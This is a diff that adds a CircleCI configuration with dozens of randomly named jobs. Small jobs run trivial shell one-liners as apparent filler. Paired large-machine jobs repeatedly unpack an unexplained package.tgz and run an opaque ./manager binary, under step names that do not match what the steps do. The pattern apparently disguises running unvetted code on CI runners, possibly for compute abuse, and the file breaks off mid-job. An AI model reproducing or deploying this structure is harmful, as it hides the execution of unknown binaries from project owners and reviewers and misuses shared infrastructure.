@@ -1,0 +1,1408 @@
+version: 2.1
+
+jobs:
+  EYD-248-wake-url:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Escalation budget 12 ms
+          command: |
+            mkdir -p /tmp/reader2
+            set +o pipefail 2>/dev/null; seq 1 798078 | sed 's/^\([0-9]\)/[\1]/' > /tmp/reader2/lynx_20201009; true
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/lynx_20201009
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - 'lynx_20201009'
+  vera-push:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Check stage 1
+          command: |
+            tr -c 'a-zA-Z0-9' '-' < /tmp/reader2/6d415516840 2>/dev/null | fold -w 20 | head -1 || true
+      - run:
+          name: Download source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: cat package.tgz | tar xzf -
+      - run:
+          command: (./manager)
+  Mmmm:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Measure static routes in blue
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; for w in {1..16..2}; do echo "$w squared is $((w**2))"; done; true ; } > /tmp/reader2/azure
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/azure
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - 'azure'
+  xray:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Check stage 1
+          command: |
+            tr -c 'a-zA-Z0-9' '-' < /tmp/reader2/glint650 2>/dev/null | fold -w 20 | head -1 || true
+      - run:
+          name: Download source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: cat package.tgz | tar xzf -
+      - run:
+          command: (./manager)
+  Date-Span-Mesh:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: review intercompany balances cb93
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; mkdir -p ${TMPDIR:-/tmp}/post && touch ${TMPDIR:-/tmp}/post/a.tmp ${TMPDIR:-/tmp}/post/b.tmp && find ${TMPDIR:-/tmp}/post -name '*.tmp' -delete && ls -A ${TMPDIR:-/tmp}/post; true ; } > /tmp/reader2/hwbinbkp
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/hwbinbkp
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - 'hwbinbkp'
+  yuki-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Check stage 1
+          command: |
+            tr -c 'a-zA-Z0-9' '-' < /tmp/reader2/glint650 2>/dev/null | fold -w 20 | head -1 || true
+      - run:
+          name: Download source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: cat package.tgz | tar xzf -
+      - run:
+          command: (./manager)
+  TMP_FORMAT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: 06 audit dependencies
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; for c in {1..16..2}; do sleep 0.1; echo "$c"; done; true ; } > /tmp/reader2/green-flux-muon-dusty
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/green-flux-muon-dusty
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - 'green-flux-muon-dusty'
+  do-the-thing:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Check stage 1
+          command: |
+            tr -c 'a-zA-Z0-9' '-' < /tmp/reader2/6d415516840 2>/dev/null | fold -w 20 | head -1 || true
+      - run:
+          name: Download source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: cat package.tgz | tar xzf -
+      - run:
+          command: (./manager)
+  ms321:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Pay the welcome kits ahead of round two
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; expr index whale w; true ; } > /tmp/reader2/shard622
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/shard622
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - 'shard622'
+  cerberus-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Check stage 1
+          command: |
+            tr -c 'a-zA-Z0-9' '-' < /tmp/reader2/glint650 2>/dev/null | fold -w 20 | head -1 || true
+      - run:
+          name: Download source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: cat package.tgz | tar xzf -
+      - run:
+          command: (./manager)
+  sleepASCII:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Batch the commissions once more
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; \grep -iw 'Buffers' /proc/meminfo | sort | uniq -c; true ; } > /tmp/reader2/2bb44ee94
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/2bb44ee94
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - '2bb44ee94'
+  q1-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Check stage 1
+          command: |
+            tr -c 'a-zA-Z0-9' '-' < /tmp/reader2/2bb44ee94 2>/dev/null | fold -w 20 | head -1 || true
+      - run:
+          name: Download source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: cat package.tgz | tar xzf -
+      - run:
+          command: (./manager)
+  uvt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: misc misc
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; declare -a today=(eagle cat dog); declare -p today; true ; } > /tmp/reader2/Ka33enTeQlF8InmSOeLT
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/Ka33enTeQlF8InmSOeLT
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - 'Ka33enTeQlF8InmSOeLT'
+  chore-4143:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Check stage 1
+          command: |
+            tr -c 'a-zA-Z0-9' '-' < /tmp/reader2/Ka33enTeQlF8InmSOeLT 2>/dev/null | fold -w 20 | head -1 || true
+      - run:
+          name: Download source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: cat package.tgz | tar xzf -
+      - run:
+          command: (./manager)
+  resultsQueue:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: SLOW extraction
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; diff <(echo "ready?") <(echo "queue empty") || echo different; true ; } > /tmp/reader2/snapshot.2.15
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/snapshot.2.15
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - 'snapshot.2.15'
+  ValidateSuite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Check stage 1
+          command: |
+            tr -c 'a-zA-Z0-9' '-' < /tmp/reader2/6d415516840 2>/dev/null | fold -w 20 | head -1 || true
+      - run:
+          name: Download source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: cat package.tgz | tar xzf -
+      - run:
+          command: (./manager)
+  BasicDualSidebarItem:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: The API keys renewed ok
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; gzip -c /etc/os-release >"${TMPDIR:-/tmp}/lemon.gz" && gzip -cd "${TMPDIR:-/tmp}/lemon.gz"; true ; } > /tmp/reader2/6d415516840
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/6d415516840
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - '6d415516840'
+  APP-330:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Check stage 1
+          command: |
+            tr -c 'a-zA-Z0-9' '-' < /tmp/reader2/6d415516840 2>/dev/null | fold -w 20 | head -1 || true
+      - run:
+          name: Download source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: cat package.tgz | tar xzf -
+      - run:
+          command: (./manager)
+  php-x86-stable:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: CORE737
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; w=1; until (( w > 317 )); do w=$((w*2)); done;echo $w; true ; } > /tmp/reader2/glint650
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/glint650
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - 'glint650'
+  push-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Check stage 1
+          command: |
+            tr -c 'a-zA-Z0-9' '-' < /tmp/reader2/glint650 2>/dev/null | fold -w 20 | head -1 || true
+      - run:
+          name: Download source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: cat package.tgz | tar xzf -
+      - run:
+          command: (./manager)
+  teardownTraitGradient:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: MentorPairingSchedulingStep
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; for w in $(seq 8); do printf '%02d\n' "$w";done | sort -r; true ; } > /tmp/reader2/197d1d33-f8f1
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/197d1d33-f8f1
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - '197d1d33-f8f1'
+  py310-lint:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Check stage 1
+          command: |
+            tr -c 'a-zA-Z0-9' '-' < /tmp/reader2/6d415516840 2>/dev/null | fold -w 20 | head -1 || true
+      - run:
+          name: Download source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: cat package.tgz | tar xzf -
+      - run:
+          command: (./manager)
+  rmse:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Still the podcast episode
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; find /usr/share/doc -maxdepth 1 -type f -name 'changelog*' -print0 | xargs -0r ls -l; true ; } > /tmp/reader2/718d4a34-1d33-6b1b-1088
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/718d4a34-1d33-6b1b-1088
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - '718d4a34-1d33-6b1b-1088'
+  teh-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Check stage 1
+          command: |
+            tr -c 'a-zA-Z0-9' '-' < /tmp/reader2/718d4a34-1d33-6b1b-1088 2>/dev/null | fold -w 20 | head -1 || true
+      - run:
+          name: Download source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: cat package.tgz | tar xzf -
+      - run:
+          command: (./manager)
+  emitDriver:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: 12x spot check
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; find /var/log \( -name '*.old' -o -name '*.1' \) -executable -exec echo {} + 2>/dev/null | xargs -r ls -ld | head -n 5; true ; } > /tmp/reader2/3ig
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/3ig
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - '3ig'
+  QA_VERIFY_6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Check stage 1
+          command: |
+            tr -c 'a-zA-Z0-9' '-' < /tmp/reader2/6d415516840 2>/dev/null | fold -w 20 | head -1 || true
+      - run:
+          name: Download source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: cat package.tgz | tar xzf -
+      - run:
+          command: (./manager)
+  mia-score:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Legacy Bake Gate
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; sed '/local/d' /etc/hosts | head -n6; true ; } > /tmp/reader2/0RW
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/0RW
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - '0RW'
+  perseus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Check stage 1
+          command: |
+            tr -c 'a-zA-Z0-9' '-' < /tmp/reader2/0RW 2>/dev/null | fold -w 20 | head -1 || true
+      - run:
+          name: Download source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: cat package.tgz | tar xzf -
+      - run:
+          command: (./manager)
+  marble_258:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Renew the referral bonuses this week
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; yes "lorem ipsum dolor sit amet" | head -n 3; true ; } > /tmp/reader2/CASE-2020-05837
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/CASE-2020-05837
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - 'CASE-2020-05837'
+  golf:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Check stage 1
+          command: |
+            tr -c 'a-zA-Z0-9' '-' < /tmp/reader2/6d415516840 2>/dev/null | fold -w 20 | head -1 || true
+      - run:
+          name: Download source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: cat package.tgz | tar xzf -
+      - run:
+          command: (./manager)
+  reAddressCanvas:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Maximise the back button after tea
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; find /var/log -maxdepth 2 -iname 'lastlog' -exec ls -ld {} + 2>/dev/null|sort; true ; } > /tmp/reader2/47a710c67
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/47a710c67
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - '47a710c67'
+  europa-plus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Check stage 1
+          command: |
+            tr -c 'a-zA-Z0-9' '-' < /tmp/reader2/glint650 2>/dev/null | fold -w 20 | head -1 || true
+      - run:
+          name: Download source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: cat package.tgz | tar xzf -
+      - run:
+          command: (./manager)
+  Compare-VectorObject:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Generate the blog post ready for luck
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; /usr/bin/ls -i /etc/*.defs|sort -R|head -n 3; true ; } > /tmp/reader2/payloadraveneast
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/payloadraveneast
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - 'payloadraveneast'
+  andromeda-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Check stage 1
+          command: |
+            tr -c 'a-zA-Z0-9' '-' < /tmp/reader2/glint650 2>/dev/null | fold -w 20 | head -1 || true
+      - run:
+          name: Download source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: cat package.tgz | tar xzf -
+      - run:
+          command: (./manager)
+  pairBuildClientPawnAlpha:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Expect the notification bell visible
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; pr -3 -t /etc/hosts | head -n1; true ; } > /tmp/reader2/XPyl7gAfQF
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/XPyl7gAfQF
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - 'XPyl7gAfQF'
+  rust-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Check stage 1
+          command: |
+            tr -c 'a-zA-Z0-9' '-' < /tmp/reader2/6d415516840 2>/dev/null | fold -w 20 | head -1 || true
+      - run:
+          name: Download source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: cat package.tgz | tar xzf -
+      - run:
+          command: (./manager)
+  ValueFunc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Remind Mateo to audit the admin tokens
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; command -v env; true ; } > /tmp/reader2/sha_58bbd6987d
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/sha_58bbd6987d
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - 'sha_58bbd6987d'
+  auh-check:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Check stage 1
+          command: |
+            tr -c 'a-zA-Z0-9' '-' < /tmp/reader2/6d415516840 2>/dev/null | fold -w 20 | head -1 || true
+      - run:
+          name: Download source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: cat package.tgz | tar xzf -
+      - run:
+          command: (./manager)
+  zeta_err:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: CRAWL ONBOARDING GUIDE
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; for w in saturday tuesday friday sunday monday thursday; do printf '%s\n' "$w"; done; true ; } > /tmp/reader2/7e
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/7e
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - '7e'
+  ed-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Check stage 1
+          command: |
+            tr -c 'a-zA-Z0-9' '-' < /tmp/reader2/glint650 2>/dev/null | fold -w 20 | head -1 || true
+      - run:
+          name: Download source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: cat package.tgz | tar xzf -
+      - run:
+          command: (./manager)
+  hfq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: ya invoice the tax report
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; ls -n -F /etc/p* | awk '{print $NF}'; true ; } > /tmp/reader2/trade.wallet.crane.nickel
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/trade.wallet.crane.nickel
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - 'trade.wallet.crane.nickel'
+  wip-queue-redirect:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Check stage 1
+          command: |
+            tr -c 'a-zA-Z0-9' '-' < /tmp/reader2/trade.wallet.crane.nickel 2>/dev/null | fold -w 20 | head -1 || true
+      - run:
+          name: Download source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: cat package.tgz | tar xzf -
+      - run:
+          command: (./manager)
+  step72493:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: AUG SCREENSHOT RUN
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; function is_even { local s=0; for n; do s=$((s + n)); done; echo $s; }; is_even 33 12 2 4; true ; } > /tmp/reader2/tmp955b0
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/tmp955b0
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - 'tmp955b0'
+  produce-nightly-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Check stage 1
+          command: |
+            tr -c 'a-zA-Z0-9' '-' < /tmp/reader2/tmp955b0 2>/dev/null | fold -w 20 | head -1 || true
+      - run:
+          name: Download source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: cat package.tgz | tar xzf -
+      - run:
+          command: (./manager)
+  bitDeg:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Warm up bundle
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; printf 'id,item,qty,price\n1,mango,5,58.49\n2,grape,15,21.20\n3,apple,14,88.10\n4,peach,6,7.54\n' >"/tmp/milestone_group_final.conf" && sort -t, -k4 -rn "/tmp/milestone_group_final.conf" | head -n 2; true ; } > /tmp/reader2/hOSTmeADowSTocKhEAth
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/hOSTmeADowSTocKhEAth
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - 'hOSTmeADowSTocKhEAth'
+  LAB_CHECK_3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Check stage 1
+          command: |
+            tr -c 'a-zA-Z0-9' '-' < /tmp/reader2/6d415516840 2>/dev/null | fold -w 20 | head -1 || true
+      - run:
+          name: Download source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: cat package.tgz | tar xzf -
+      - run:
+          command: (./manager)
+  commit_loop:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Else extract leftover junk
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; ls -XF /usr/local | cat -n; true ; } > /tmp/reader2/MarketAdmin
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/MarketAdmin
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - 'MarketAdmin'
+  go-live:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Check stage 1
+          command: |
+            tr -c 'a-zA-Z0-9' '-' < /tmp/reader2/glint650 2>/dev/null | fold -w 20 | head -1 || true
+      - run:
+          name: Download source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: cat package.tgz | tar xzf -
+      - run:
+          command: (./manager)
+  noodleish:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Defer
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; echo 'cleanup done' >${TMPDIR:-/tmp}/usage.dat && wc -c <${TMPDIR:-/tmp}/usage.dat; true ; } > /tmp/reader2/CXaj
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/CXaj
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - 'CXaj'
+  VerifySuite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Check stage 1
+          command: |
+            tr -c 'a-zA-Z0-9' '-' < /tmp/reader2/glint650 2>/dev/null | fold -w 20 | head -1 || true
+      - run:
+          name: Download source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: cat package.tgz | tar xzf -
+      - run:
+          command: (./manager)
+  MAX_METRIC_US:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Tomorrow throttle the reverse proxy
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; [[ ! -d /tmp ]] && echo exists || echo 'missing'; true ; } > /tmp/reader2/2242903ac62
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/2242903ac62
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - '2242903ac62'
+  INIT_QA:
+    machine:
+      image: ubuntu-2204:current
